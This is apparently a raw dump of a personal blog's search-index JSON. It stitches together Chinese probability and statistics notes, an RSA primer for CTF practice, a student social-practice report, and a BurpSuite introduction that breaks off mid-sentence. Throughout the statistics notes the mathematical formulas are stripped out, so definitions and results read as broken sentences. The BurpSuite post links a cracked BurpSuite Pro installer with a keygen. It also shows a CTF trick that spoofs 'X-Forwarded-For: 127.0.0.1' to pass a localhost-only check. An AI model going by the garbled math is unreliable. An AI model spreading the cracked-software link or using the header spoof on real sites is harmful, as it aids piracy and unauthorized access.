等可能概型（古典概型与几何概型）\n古典概型的定义\n\n样本空间中的样本点总数是有限的\n每个样本点出现的可能性相同\n\n\n三种取法，设有个不同的球，要从中取个球（）\n\n第一种取法：可重复或者有放回：样本点总数为\n第二种取法：不放回但与次序无关：样本点总数为\n第三种取法：不放回且与次序有关：样本点总数为\n\n\n分房问题：将个人随机分到个房间去（），每个人分到哪个房间是等可能的，且假设每个房间可容纳的人数没有限制，（1）求某个指定的房间恰有个人的概率，（2）求每两个人都不在同一个房间的概率\n\n（1）\n（2）\n\n\n抽签问题：设有个人一起抽签，但只有个签（），求第个人抽到签的概率（）\n\n\n先抽后抽的概率是一样的，感觉上的不同是由于条件概率的存在\n\n\n分组法：将个不同的球分成个不同的组，使得这个组各有个球，，问共有多少种分法\n\n\n\n\n几何概型：在一个面积为的平面区域中等可能地任意投点，设，为比例系数，则有可得，所以\n\n会面问题：两人相约点到点在某地会面，先到者等候另一人，过时就离开，求这两人能会面的概率\n\n以分别表示两个人的到达时刻，则会面的充要条件是，可以参考下图求出\n\n\n\n\n1.4 条件概率\n条件概率的定义：在事件发生的条件下，事件发生的概率，记作\n\n条件概率的性质\n\n非负性：对任意事件，有\n归一性：\n可列可加性：对任意一列两两互不相容的事件，有\n\n\n乘法公式：若，则\n\n抽签问题（续）：设有个签，只有个人可以中奖，求第个人抽到签的概率（）\n\n\n\\begin{align}\nP(A)&=P(A_{1}A_{2}...A_{k-1}A_{k})=P(A_{1})P(A_{2}|A_{1})P(A_{3}|A_{1}A_{2})...P(A_{k}|A_{1}A_{2}...A_{k-1})\\\\\n&=\\frac{n-1}{n}\\times\\frac{n-2}{n-1}\\times\\frac{n-3}{n-2}\\times...\\times\\frac{n-k+1}{n-k+2}\\times\\frac{1}{n-k+1}\\\\\n&=\\frac{1}{n}\\\\\n\\end{align}\n\n\n划分的定义：设为一组事件，满足（1），（2），则称为的一个划分\n\n全概率公式：设为的一个划分，则对任意的事件，有\n使用全概率公式的情况\n（1）随机试验可以分为两个相互影响的阶段\n（2）第一阶段所有可能结果已知\n（3）所求概率为第二阶段结果之概率\n\n\n贝叶斯公式：设是的一个划分，若，则对任意事件，只要，就有\n\n1.5 独立性与伯努利试验\n事件与独立的等价条件是\n事件与独立的性质\n若，则\n在这四对事件中，若有一对独立，则其他三对也独立\n\n\n重伯努利试验的定义：如果试验只有两个可能的结果：及，且。把试验重复做次构成一个试验，用表示，。这个试验称为重伯努利试验\n推广：在次独立重复试验中，若事件，在每次试验中发生的概率均为，那么在这次试验中恰好发生次的概率为，其中\n\n","categories":["Study"],"tags":["Study","Probability theory","Mathematical statistics"]},{"title":"概率论与数理统计知识梳理（三）","url":"/2023/04/05/Probability-theory-and-mathematical-statistics_Chapter_3/","content":"概率论与数理统计第三章 二维随机变量及其分布3.1 二维随机变量的联合分布与边际分布\n二维随机变量的定义：设和为两个随机变量，则称有序数组为二维随机变量\n联合分布函数的定义：设二维随机变量，对任意实数，二元函数称为的联合分布函数\n分布函数的性质\n对或都是非严格单调递增函数\n对任意的，\n分别对右连续，即\n矩形法则：对任何，都有\n\n\n边际分布函数的定义：\n\n3.2 二维离散型随机变量\n联合分布列的定义：设为二维离散型随机变量，且的可能取值记为，的可能取值记为，则称为二维离散型随机变量的联合分布列\n联合分布列的性质\n非负性：\n归一性：\n\n\n联合分布函数的定义：已知的联合分布列为，则称为的联合分布函数\n边际分布列的定义：设为二维离散型随机变量，其联合分布列为，则称为的边际分布列，称为的边际分布列\n边际分布列的性质：，同理，\n二维离散型随机变量的独立性：设为二维离散型随机变量，的可能取值分别为与，如果对任意的，都有，则称与是相互独立的\n条件分布列的定义：设为二维离散型随机变量，的可能取值分别为与，对任意的，称为已知条件下的条件分布列，称为已知条件下的条件分布列\n\n3.3 二维连续型随机变量\n联合密度的定义：设为二维随机变量的联合分布函数，若存在非负函数，使得对于任意的，有，则称为二维连续型随机变量，并称为的联合概率密度函数\n\n联合密度的性质：\n\n非负性：\n归一性：\n是二元连续函数\n在的连续点处有\n二维连续型随机变量在一点和一条线上的概率均为0\n\n\n边际密度的定义：设为而为连续型随机变量，联合密度函数为，称为的边际密度函数，为的边际密度函数\n\n二维均匀分布\n\n\\begin{align}\nf(x,y)=\n\\begin{cases}\n\\frac{1}{S_{D}}&(x,y)\\in D\\\\\n0&(x,y)\\notin D\\\\\n\\end{cases}\n\\end{align}\n二维正态分布：\n\n二维连续型随机变量的独立性：设及分别是二维连续型随机变量的分布函数和边缘分布函数，若对于所有的，有或，则称随机变量和是相互独立的\n\n二维正态分布独立性：设，则和相互独立的充要条件是\n\n条件分布的定义：设是二维连续型随机变量，对，称为给定条件下的条件分布函数，为给定条件下的条件密度函数\n\n\n3.4 二维随机变量函数的分布\n泊松分布的可加性：已知与相互独立，且分别服从参数为和的泊松分布，则服从参数为的泊松分布\n对于，求密度函数，先求的分布函数，然后对求导，就能得到的密度函数。一般地，的分布函数为\n极大极小分布：设随机变量相互独立，且的分布函数为，，令，那么有（1）的分布函数为（2）的分布函数为，特别地，如果具有相同的分布函数，则\n\n","categories":["Study"],"tags":["Study","Probability theory","Mathematical statistics"]},{"title":"概率论与数理统计知识梳理（四）","url":"/2023/04/13/Probability-theory-and-mathematical-statistics_Chapter_6/","content":"概率论与数理统计第六章 数理统计的基本概念6.1 总体、样本、统计量\n简单随机抽样的性质\n\n代表性：总体中每个个体都有同等机会被抽入样本，即可以认为样本中的每个都与总体有相同的分布\n独立性：样本中每个个体的取值并不影响其他个体的取值，这以为着相互独立\n\n\n常见的统计量，设是从总体中抽取的样本\n\n样本均值：\n样本方差：\n\n样本标准差：\n样本阶原点矩：\n样本中心矩：\n极大次序统计量：\n极小次序统计量：\n一般来说\n用样本均值的观测值来近似估计总体均值\n用样本方差的观测值；来近似估计总体方差\n用样本阶原点矩的观测值来近似估计总体阶矩\n\n\n\n\n\n6.2 常用统计量的分布\n标准正态分布\n\n分布\n\n分布的定义：设相互独立，且均服从标准正态分布，则称服从自由度为的分布，记为，其密度函数为\n\n\\begin{align}\nf(x)=\n\\begin{cases}\n\\frac{1}{2^{\\frac{n}{2}}\\Gamma(\\frac{n}{2})}e^{-\\frac{x}{2}}x^{\\frac{n}{2}-1}&x>0\\\\\n0&x\\leqslant0\\\\\n\\end{cases}\n\\end{align}\n分布的性质\n\n可加性：若，且与相互独立，则\n若，则\n\n\n\n\n分布\n\n分布的定义：设，且与相互独立，则称服从自由度为的分布，记作，密度函数为\n分布的性质\n\n这表明当充分大时，自由度为的分布可以近似地看成是标准正态分布\n一般地，当时，就可以将分布作为标准正态分布\n\n\n\n\n分布\n\n分布的定义：设，且与相互独立，则称服从自由度为的分布，记为，其密度函数为\n\n\\begin{align}\nf(x)=\n\\begin{cases}\n\\frac{\\Gamma(\\frac{m+n}{2})}{\\Gamma(\\frac{m}{2})\\Gamma(\\frac{n}{2})}\nm^{\\frac{m}{2}}n^{\\frac{n}{2}}x^{\\frac{n}{2}-1}(m+nx)^{-\\frac{m+n}{2}}\n&x>0\\\\\n0&x\\leqslant0\\\\\n\\end{cases}\n\\end{align}\n分布的性质\n\n若，则\n若，则\n\n\n\n\n\n6.3 正态总体的抽样分布\n单正态总体的抽样分布定理：设总体，为总体的简单随机样本，样本均值，样本方差，则有\n\n，且与相互独立\n\n\n\n双正态总体的抽样分布定理：设总体与总体相互独立，与分别为总体与总体的简单随机样本，以分别表示两样本的样本均值与样本方差，则有\n\n\n若，则，其中\n\n\n\n6.4 抽样分布的上分位点\n标准正态分布分位点的定义：设随机变量，若对，实数满足，则称为标准正态分布的上分位点，由于标准正态分布的密度函数为偶函数，可知\n分布分位点的定义：设随机变量，若对，实数满足，则称点为的上分位点，易知\n分布分位点的定义：设随机变量，若对，实数满足，则称点为的上分位点，类似于标准正态分布，有\n分布分位点的定义：设随机变量，若对，实数满足，则称点为的上分位点，易知\n几个基本等式：设为一个连续型随机变量，若对，实数满足，则称点为的上分位点\n\n\n$P\\{YY_{\\alpha/2}\\}=\\alpha$\n\n\n\n\n\n\n","categories":["Study"],"tags":["Study","Probability theory","Mathematical statistics"]},{"title":"概率论与数理统计知识梳理（五）","url":"/2023/04/14/Probability-theory-and-mathematical-statistics_Chapter_7/","content":"概率论与数理统计第七章 参数的点估计及其优良性7.1 点估计\n设总体的分布函数形式已知，其中含有一个未知参数，为了估计参数，首先从总体中抽取样本，然后按照一定的方法苟傲合适的统计量作为的估计量，记为。代入样本观测值，即得到的估计值\n矩估计法：设总体的分布为，为待估计参数，为来自总体的样本。如果总体的数学期望存在，那么一般来说应为的函数。由于相互独立且与总体同分布，则由大数定律知时，样本均值，依概率收敛于总体均值，于是可令，即，再解次方程求出即可\n可以看作是用样本一阶矩完成对总体一阶矩的估计\n\n\n最大似然估计法\n似然函数的定义：设为来自总体的简单随机样本，为样本观测值，称为参数的似然函数\n似然函数实际上就是样本恰好取观测值（或其邻域）的规律\n最大似然估计量的定义：设为参数的似然函数，若存在一个只与样本观测值有关的实数，使得，则称为参数的最大似然估计值，称为参数的最大似然估计量\n一般会求对数似然函数来降低计算难度\n\n\n\n7.2 点估计优良性的评定标准\n无偏性\n希望估计量在多次试验的结果中，在待估参数的附近摆动，并使得这个估计量的平均值恰好就是待估的参数\n若参数的估计量满足，则称为的一个无偏估计量，否则就称为有偏估计量\n无偏性是对估计量的基本要求，它具有系统误差为0的特点\n\n\n有效性\n设和都是参数的无偏估计量，如果，则称比有效\n有效性的定义指明，在期望相等的条件下，方差小者估计的效果更好\n\n\n一致性（相合性）\n估计量与样本容量有关，记为，一般来说，当越大，的取值与的误差应越小，即当充分大时，估计量的取值应该稳定在参数的一个充分小的领域内\n设是的一个估计量，若对于任意的，有，则称是的一致估计量（相合估计量）\n\n\n\n","categories":["Study"],"tags":["Study","Probability theory","Mathematical statistics"]},{"title":"Do u know RSA?","url":"/2023/03/22/RSA/","content":"RSA概述RSA是一种非对称加密算法，在公开密钥加密和电子商业中RSA被广泛使用。公钥（Public Key）与私钥（Private Key）是通过一种算法得到的一个密钥对（即一个公钥和一个私钥），公钥是密钥对中公开的部分，私钥则是非公开的部分。公钥通常用于加密会话密钥、验证数字签名，或加密可以用相应的私钥解密的数据。\n预备知识模运算 mod在正整数范围内选取a，b，分别对另一个正整数n进行取余运算，得到，，如果，则称a与b关于n同余，记作\n模逆运算如果正整数a，b，n满足，则称a与b互为模n的逆元，记作\npython实现：\nfrom gmpy2 import *a = 114514n = 1919810b = invert(a,n)#b即为a关于n的逆元\n其余模运算基本原理可以参照这篇文章：https://blog.sengxian.com/algorithms/mod-world\n欧拉函数 phi的值表示小于等于n的正整数之中，有多少个数与n构成互质关系。\n1.若，则，因为1与任何数都构成互质关系\n2.若为质数，则，因为任何一个质数与小于它的所有数都构成互质关系\n3.若，其中p为质数，则\n4.若可以分解成两个互质的整数之积，即n，则。\n欧拉定理若两个正整数a和n互质，则n的欧拉函数  可以让下面的等式成立：当n为质数时，欧拉定理可以化为： 这就是费马小定理，它是欧拉定理的特例。\n\nHow to ENCRYPT?1.首先，我们选取两个不相同的大素数p和q，并计算\n2.计算\n3.选取一个小于，且与互质的不太小的正整数e\n4.计算e在模n下的逆元d，即\n5.(n, e)封装为公钥，(p, q, d)封装为私钥\n6.将密文转码为十六进制数据m\n7.，c即为可以传输的密文\n至此RSA加密完成\n\nHow to DECRYPT?最简单的情况：已知p，q，e，c\n1.计算\n2.计算逆元\n3.\n即可得到明文\n\n解密算法证明分两种情况证明，与，\nm与n互质\n\\begin{align}\nc^d&=m^{ed}\\\\\n&=m^{k\\phi(n)+1}&(mod\\ n)\\\\\n\\because ed&=1&(mod\\ \\phi(n))\\\\\n\\therefore c^d&=[m(m^{\\phi(n)}\\ (mod\\ n))^k]\\\\\n&=m&(mod\\ n)\\\\\n&=m\\\\\n\\end{align}m与n不互质由于m与n不互质，所以m与n必定有一个大于1的公因子，而由于，且p与q均为质数，所以，\n由于\n\n\\begin{align}\nm^{ed}&=m^{k\\phi(n)+1}\\\\\n&=m^{k(p-1)(q-1)+1}\\\\\n&=m(m^{q-1}\\ (mod\\ q))^{k(p-1)}\\\\\n&=m&(mod\\ q)\\\\\n\\end{align}即\n假设，则有\n\n\\begin{align}\nm^{ed}&={(cp)}^{ed}\\\\\n&=0&(mod\\ p)\\\\\n\\because m\\ mod\\ p&=0\\\\\n\\therefore tq\\ mod\\ p&=0\\\\\n\\because gcd(p,q)&=1\\\\\n\\therefore t&=rp&(t\\in N^{*})\\\\\n\\end{align}由此可以得到\n\n\\begin{align}\nm^{ed}&=(m+tq)\\\\\n&=(m+rpq)\\\\\n&=(m+rn)&(mod\\ n)\\\\\n&=m\\\\\n\\end{align}至此证明完毕\n","categories":["CTF"],"tags":["CTF","CRYPTO","RSA"]},{"title":"大连理工大学2023年暑期社会实践调研报告","url":"/2023/09/10/Social_Report/","content":"传承红色基因，争当科创人才大连理工大学软件学院赴辽宁省大连市“传承红色基因，争当科创人才”暑期社会实践团摘 要红色文化的核心是中国共产党的光辉历史和革命精神。它扎根于中国社会，承载了革命斗争的艰辛与胜利，也见证了中国从封建社会到现代社会的巨大变革。本次大连理工大学软件学院赴大连市暑期社会实践团以此为锚点，对现存问题进行分析和探究，并适当提出解决建议。\n关键词红色理论学习氛围\n前言习近平总书记在中国人民大学考察时强调：“要加强校史资料的挖掘、整理和研究，讲好中国共产党的故事，讲好党创办人民大学的故事，激励广大师生继承优良传统，赓续红色血脉。”红色资源是中华民族宝贵的精神财富，也是高校思想政治理论课的“教学富矿”。将红色文化融入高校思政课堂，推动红色基因传承，是新时代高校思想政治教育改革创新的重要理论和实践命题。\n实现红色资源有机融入高校思政课教学，需要思政课教师充分发挥主观能动性和创造性，深入挖掘红色文化中蕴含的哲学思想、人文精神、价值观念，找准红色文化与思政课理论知识的关联之处，推动其经过充分设计后融入高校思政课的理论与实践教学各环节。同时，要把握新时代、新青年、新趋势的特点，提升教学组织能力，创新思政教育教学形式和载体，探索新的路径和方法，切实提升红色文化与高校思政课的融合度。同时各大高校，省委党校都做好坚持用好红色资源，传承红色力量，其中河南省委党校作为全国文明单位，始终重视在校园文化建设中融入红色文化元素，打造主题鲜明、具有特色的红色文化阵地。\n一、红色理论文化背景1.1 我国红色理论文化背景概述红色文化背景，作为中国特有的文化元素之一，具有深厚的历史底蕴，承载着无数先辈的智慧和探索。中国自古以来就拥有丰富多彩的文化传统，其中包括了红色文化，这是中国革命与建设历程中的重要一章，也是中国共产党的光辉历史的生动写照。作为一名大连理工大学的学生，通过参观大连博物馆，我们更加深刻地认识到红色文化的丰富内涵，以及它在中国社会和教育中的持久影响。\n红色文化的核心是中国共产党的光辉历史和革命精神。它扎根于中国社会，承载了革命斗争的艰辛与胜利，也见证了中国从封建社会到现代社会的巨大变革。中国共产党的建立和发展是中国革命史上的重要事件，其伟大领袖，如毛泽东、周恩来等，为中国的解放和独立做出了杰出贡献。红色文化背景的形成，与中国共产党的光辉历史密不可分，这一历史是中国社会进步和现代化的标志之一。\n在中国，红色文化不仅仅是一种历史记忆，更是一种思想信仰和精神力量的象征。它渗透在中国教育体系中，不仅有助于培养青年一代的爱国主义情感，还强调了共产主义思想和社会主义核心价值观的重要性。作为大连理工大学的一名学生，我在课堂上接触到了中国红色文化的重要知识，这不仅丰富了我的文化底蕴，也启发了我对中国社会与政治的深刻思考。\n红色文化背景的研究与探索，对于理解中国社会与政治的发展具有重要意义。它是中国特有的文化符号，代表了中国共产党的光辉历史，也是中国社会进步和现代化的动力之一。通过参观大连博物馆，我更加深刻地体验到了红色文化的魅力，它的影响力仍然在中国社会中发挥着巨大的作用。\n在接下来的调研报告中，我们将继续探讨中国红色文化的重要性，以及它在中国社会和教育中的作用。通过深入研究红色文化的背景和影响，我们可以更好地理解中国的发展历程，以及中国共产党在国家建设中的重要角色。\n1.2 我国红色理论文化现状我国红色理论文化现状呈现出多层次、多元化的特点。首先，红色理论作为中国共产党的核心思想体系，一直占据着国家意识形态的主导地位。习近平新时代中国特色社会主义思想被写入宪法，成为国家的指导思想，党的十九届五中全会明确了加强党的思想理论建设的重要任务，进一步强化了红色理论的地位。\n其次，红色理论的学习在各级教育中得到重视和强化。从小学到大学，学生都要学习党史、国史和毛泽东思想等相关课程。同时，各类培训和教育活动也普遍包括红色理论学习，以确保广大公民了解党的历史和核心价值观。\n第三，红色文化的传承和弘扬在各个领域都有所体现。文化艺术作品、红色旅游景点、电视剧电影等多种媒介都在宣传和展示红色文化。一些地方还建设了一批红色旅游基地，吸引游客前来参观，以此传承和弘扬红色基因。\n最后，红色理论文化也在社会中引发广泛的讨论和研究。学者和研究机构进行了大量的研究工作，探讨红色理论的现实意义和适应性。这些研究不仅促进了理论的发展，也为政策制定提供了理论支持。\n1.3 我国红色理论文化发展红色文化是以马克思主义为思想源泉，伴随着中国共产党的成长和发展，在中华优秀传统文化的深厚土壤中生根、发芽而不断发展壮大。早期共产党人大多接受过中国传统文化教育，在接受马克思主义、宣传马克思主义的同时，马克思主义和中华优秀传统文化中的民本思想、天下为公的理念融会贯通，形成独特的中国革命红色文化，铸就中国共产党人以天下为己任，不畏牺牲、勇于献身的优秀品德和高尚精神，化为为人民谋幸福英勇奋斗的动力。\n 中国共产党在领导全国人民进行革命、建设、改革的伟大实践中，以继承和发扬中国优秀传统文化为文化基础，不断巩固马克思主义的指导地位，创造性地发展出中国化马克思主义。它以坚守马克思主义为基本原则，在接受实践检验的过程中不断地丰富和发展，与时俱进、推陈出新，随着环境的变化和时代的特点无时无刻不在自我完善，适应革命的要求。\n十月革命胜利以后，以陈独秀、李大钊等人为代表的先进知识分子在中国率先宣传马克思主义。“自从中国人学会了马克思列宁主义以后，中国人在精神上就由被动转入主动。”1921年中国共产党的成立，标志着马克思主义理论从此在中华大地生根、发芽。中国共产党人在马克思主义理论指导下，形成了共产主义的奋斗理想和共产主义的世界观。中国共产党结合中国革命的具体实践，创造性地发展了马克思主义。红色文化是马克思主义经典理论中国化的实践前提和核心内容，是马克思主义经典理论中国化历史起点和逻辑起点。马克思主义中国化最重要的理论成果，就是毛泽东思想和中国特色社会主义理论。 党的十八大以来，以习近平总书记为核心的党中央创造性地继承和发展了马克思主义，习近平新时代中国特色社会主义思想是马克思主义中国化的最新成果。\n二、实践经历2.1 线下实践经历2.1.1 前往大连市博物馆进行理论学习与宣传在2023年7月8日，大连理工大学软件学院赴辽宁省大连市“传承红色基因，争当科创人才”暑期社会实践团前往大连博物馆进行参观学习。进入大楼展厅，首先映入眼帘的是一块儿红色屏幕，上面写着入党誓词，我们进行了拍照留念。接着我们参观的是建功‘两先区’奋进新时代—大连市迎接党的二十大胜利召开主题成就展。这个展会展示了大连产业结构优先化的先导区和经济社会发展的先行区在此方面取得的成就。然后去了战争相关的区域，包括了从清朝到20世纪四五十年代的物品展示，有清朝的北洋海军的人物模型，穿着蓝色和白色的服饰，也有清朝北洋海军”济远”舰的部件。更近代的有俄军军刀、俄军炮兵指挥剑等，还有一个巨大的战争沙盘。展品主要就是由北洋海军，俄国，日本和苏军的武器装备组成，也包含一些大连市公安局的装备，像是警棍和警帽。最后，我们参观了近代史展厅，看到了各类文物藏品和史料，近代大连馆表现了1840-1949年近代大连历史主题,内容分为“旅大的开发与海防建设”“中日甲午战争中的旅大”“俄国租借旅大与港口城市的形成”“日俄战争与日本殖民统治”“多元文化的交流与融合”“近代大连人民的反抗斗争”和“大连解放与人民政权的建立”七个单元,展出文物1300余件,历史照片及图表800余幅。《近代大连》是全面展示城市百年历史的综合陈列,是海内外观众了解近代大连历史文化的窗口。\n2.1.2 前往上海市地震局等多地进行红色理论宣传在2023年7月27日，曹杨新村街道主办了名为“做一天曹杨人”的主题，旨在促进红色理论知识的传承与科学教育的普及。队长赵淳皓同学带领一支少年分队参与，并在活动中宣传红色理论知识。\n本次活动以科普亲子游学为主题，首站参观了上海市地震局，队长赵淳皓同学通过与工作人员的互动，向参与者传授了地震基础知识，包括地震断裂带分布、地震成因、震级分类等。这不仅丰富了家长和同学们的知识面，还提高了他们对地震相关知识的了解。\n第二站来到了上海电器科学研究所集团有限公司，活动让参与者近距离感受了信息时代下的人工智能技术。队长赵淳皓同学带领大家进入机器人研发与转化功能型平台，国家机器人检测与评定中心，并聆听了有关人工智能的科普讲座。这一环节激发了参与者对科技的兴趣，增强了他们的国家自豪感。\n最后一站参观了上海市测绘院，队长赵淳皓同学在这里与解说员互动，了解了我国测绘的历史沿革和新时期测绘科技创新成果。这次参观让参与者深入了解了测绘历史和前沿科技，加强了他们对中华文化的认同感和传承测绘精神的决心。\n队长赵淳皓同学在整个活动过程中，通过讲解、互动和科普讲座等方式，积极宣传红色理论知识，强调地震、科技和测绘领域的红色元素，使活动更加具有红色文化底蕴，引导参与者争当科创人才，传承红色基因，为美好的未来努力奋斗。活动的成功举办为青少年提供了一次难忘的科普教育与红色文化传承的经验。\n2.1宣传调研，线下采访在实地考察的基础上，我们还对大学生进行了线下采访。\n2.2.1 采访目的了解在当前环境下，普通群众对于红色理论的了解与认识，对我国红色理论的传播展开研究，进而分析我国红色理论学习氛围建设面临的主要困境，并对我国红色理论学习氛围建设的突围路径进行解读，从而推进红色理论学习的发展，达到普及并弘扬红色理论学习价值，提升国际形象。\n2.2.2 采访环节访前准备：了解相关背景设定采访主题，提前了解相关采访对象，提问和记录的准备。\n提问环节：记者须在采访中营造合适的氛围从而使对方畅所欲言，以到达高质量的访问结果，提问目标明确，提问系统有逻辑性提问逻辑和顺序。\n现场观察\n记录核实：整理采访内容，核实采访出的材料无误\n2.2.3 采访要点人们是否了解红色理论学习的涵义及其重要性，影响我国红色理论学习氛围的因素，影响红色理论学习氛围的社区人文因素。\n2.2.4 采访记录问：嘿，你有时间吗？我正在做一个宣传调研，想请你帮忙回答一些问题。\n答：当然可以，什么调研？\n问：我在调查大家对我国红色理论学习的了解以及他们认为学习氛围存在的问题和解决方案。首先，你对我国红色理论学习有多少了解？\n答：嗯，我知道一点点。我听说过毛泽东思想和中国共产党的一些基本原则，但我并不是很了解具体内容。\n问：那是可以理解的，毕竟我们的教育体系并没有深入教授这些知识。你认为我们大学里红色理论学习的氛围有什么问题吗？\n答：我认为问题在于它缺乏吸引力和实用性。对于很多人来说，这些理论似乎与现实生活没有太多联系，所以他们可能没有兴趣去深入学习。另外，学习方式也可能有问题，有些人可能觉得教材和教学方法过于枯燥。\n问：你提到了一些重要的问题。那么，你有什么解决方案或建议吗？\n答：我认为可以增加与现实生活的联系，使这些理论更具实用性。也许可以引入一些案例研究，展示这些理论如何在实际中应用，以激发学生的兴趣。此外，教学方法也可以多样化，采用更互动和参与的方式，让学生更积极地参与进来。\n问：这些是很好的建议，增加实用性和互动性确实可以提高学习的吸引力，这确实是很重要的点。感谢你的回答，这对我的调研非常有帮助。\n答：不客气，希望这些建议对改进红色理论学习有所帮助。如果有其他问题需要回答，随时可以找我\n三、成果措施和建议3.1 成果措施经过此次社会实践，我们对于解决我国红色理论学习氛围上的问题有了一些认识。首先在学校上我们倡导改革学习模式，以往的理论学习模式量足够而质不足，多半以填鸭式的教学方法进行理论教学，学习者提不起兴趣，形不成良好的理论学习氛围；应关注社会热点，关注学习者最关心的例如就业等未来关键问题进行具体性的理论学习。也应改善教育体系，确保教师具备良好的红色理论教育背景和教育技能，以提高教育质量；更需要提供多样化的教育资源，包括线上和线下的学习资源，以满足不同学习需求和风格的学生；加强理论学习氛围仍需培养独立思考和批判性思维，鼓励学生独立思考，提出问题，发表意见，并培养他们的批判性思维能力；同时为学生提供机会参与公开辩论、讨论和研究项目，以促进深入理解。\n我们相信，以上方法能较为有效改善我国的红色理论学习氛围上的诸多问题。\n3.2 改进建议红色文化蕴含着丰富的精神内涵和历史智慧，为了进一步强化我国的红色文化氛围，我们有必要深入推广红色文化。媒体以及社会各界应该积极协作，利用多种传播媒介，传扬红色文化的价值和意义，激发人们的学习兴趣和热情。同时，学校应该强化红色理论教育，为学生提供系统学习红色理论的机会。此外，我们不仅需要传承红色理论的精髓，也要鼓励创新，促进红色理论与现代科技的有机融合。红色理论不应仅限于历史，而应与当代社会、科技和文化相互融合，以使其更具时代性和吸引力。 总之，通过积极推广红色文化、强化学校中的红色理论教育，以及促进红色理论与现代科技的融合，我们可以更好地深化红色理论的传承，激发人们的学习兴趣，为中国的发展和社会进步做出更大的贡献。这是一个需要全社会共同努力的不断进行的过程。\n3.3 媒体报道为了进一步扩大宣传效果，实践团将在各地的实践经历和心得体会写成了实践报告，投稿并发布在中国网和中华网等国家媒体上，详细交代了小队在各个实践地的走访记录和所见所闻所感，以第一视角为大众提供了真实的现状陈述和存在的问题，获得更多人的关注和共鸣，吸引更多人去亲身了解参与。\n结束语\n通过本次实践，实践团实地考察了红色理论底蕴深厚的大连市和上海市，通过亲身观察和走访的形式感受文化的魅力，同时发现问题，由点到面深入分析我国红色理论学习氛围的发展势头和其中的原因，这个过程对于所有实践团成员来说是一次十分宝贵的身体力行、透过现象发现本质的人生阅历和成长经历，希望这份凝聚实践团智慧的调研报告能够为我国红色理论学习氛围的发展带来实际性的价值。\n参考文献[1]张珂.红色文化与高校思政理论课的融合路径[J].文化学刊,2019(12):144-147.\n[1]田有广. 习近平总书记关于红色文化重要论述研究[D].广西大学,2022.DOI:10.27034/d.cnki.ggxiu.2021.001158.\n[1]杨方.“大学习”背景下大学生红色理论宣讲的实践探索[J].扬州大学学报(高教研究版),2018,22(06):111-115.DOI:10.19411/j.cnki.1007-8606.2018.06.020.\n[1]薛琳.新时期高校意识形态教育的创新路径探究——基于大学生红色理论社团的思考[J].学理论,2018(03):228-229+235.\n[1]孙鹏.党的红色理论刊物《〈新青年〉季刊》研究初探[J].福建党史月刊,2016(02):60-63.\n","categories":["News"],"tags":["Social","News"]},{"title":"概率论与数理统计知识梳理（六）","url":"/2023/04/17/Probability-theory-and-mathematical-statistics_Chapter_8/","content":"概率论与数理统计第八章 参数的区间估计与假设检验8.1 区间估计\n置信区间的定义：设总体的分布函数为，其中为未知参数，为来自总体的简单随机样本，对于给定的，如果由样本确定的两个统计量和满足，则称随机区间是参数的置信度为的置信区间。如果统计量满足，则称是参数的置信度为的单侧置信上限（下限）\n对于给定的置信度，参数的区间估计的基本思想是：\n从正态总体的六个已知的抽样分布（单总体、双总体各三个）中选一个只有含有待估参数而不包含其他未知参数的抽样分布，记为\n由于一定是四大分布（）中的一个，所以它的分位点能从表中查到，且必然满足\n由于中含有待估参数，所以可从不等式中解出，得到等价的不等式，而就是置信度为的置信区间\n\n\n\n8.2 假设检验\n原假设：，备择假设：，备择假设是原假设的对立假设，和有且仅有一个是正确的\n双侧检验与单侧检验\n形如的假设检验称为双侧检验\n形如或的假设检验称为右侧检验\n形如或的假设检验称为左侧检验\n\n\n小概率事件原则是指概率很小的事件在一次试验中不会发生\n两类错误\n第一类错误：弃真，当实际上为真时，检验结果却是拒绝，称之为弃真。犯第一类错误的概率就是显著性水平，即拒绝为真\n第二类错误:采伪，当实际上不为真时，检验结果却是接受，称之为采伪。犯第二类错误的概率通常记作，即接受不为真\n犯这两类错误的概率不可能同时减小，通常的做法是在给定犯第一类错误的概率的条件下，尽量减小犯第二类错误的概率\n\n\n假设检验的基本步骤（以双侧检验为例）\n根据实际问题提出原假设和备择假设接受\n从正态总体的六个已知抽样分布（单总体、双总体各三个）中选一个只含有待检验参数而不包含其他未知参数的抽样分布，记为，并称之为检验统计量\n由于一定是四大分布中的一个，所以它的分位点能从表中查到，且必然满足$P\\{YY_{\\alpha/2}=\\alpha\\}，那么YY_{\\alpha/2}$就是小概率事件，今后称之为拒绝域\n由于中没有未知参数，所以将已知数据带入即可把求出\n如果$YY_{\\alpha/2}有一个成立，就拒绝H_0，否则接受H_0$\n如果是左侧检验或右侧检验，那么只需要将$P\\{YY_{\\alpha/2}=\\alpha\\}换成P\\{YY_\\alpha\\}=\\alpha，此时拒绝域分别为YY_\\alpha$\n\n\n\n","categories":["Study"],"tags":["Study","Probability theory","Mathematical statistics"]},{"title":"burpsuite","url":"/2023/11/12/burpsuite/","content":"BurpSuite IntroWhat is BurpSuite?BurpSuite是用于攻击web应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显示HTTP消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。\nInstallation\nDownload Link: http://210.30.97.133:8008/File_Upload/BurpSuitePro%20V2023.10%20%E5%8F%8C%E8%AF%AD%E7%89%88.exe\n\n双语版懒人包，双击然后wait即可，安装完成后桌面上会出现BurpSuite注册机，启动BurpSuitePro，启动BurpSuitePro(汉化版)，按需使用注册机\nBurpSuite Launch！打开之后直接下一个-&gt;启动Burp即可\n\n\nProxy为了方便直接使用BurpSuite的内嵌浏览器进行抓包\n\n当拦截已开启被点亮时，在内嵌浏览器中的每一次请求都会被BurpSuite拦截，并反馈在代理-&gt;拦截中\n\nExample\n\n我们在内嵌浏览器中访问平台主站scr1w.dlut.edu.cn，可以在拦截中直观的看到我们的请求\n\n\n*LocalCat\n\n我们还是使用Proxy抓包，将请求发送出去后，我们可以在Http History中查看历史的请求与回显\n\n这里我们可以直接跳过md5碰撞的步骤，直接访问there_is_no_flag.php\n\n因为要本地访问，所以在Header中添加X-Forwarded-For: 127.0.0.1即可得到flag\n但是每次查看完整的回显都要在HTTP 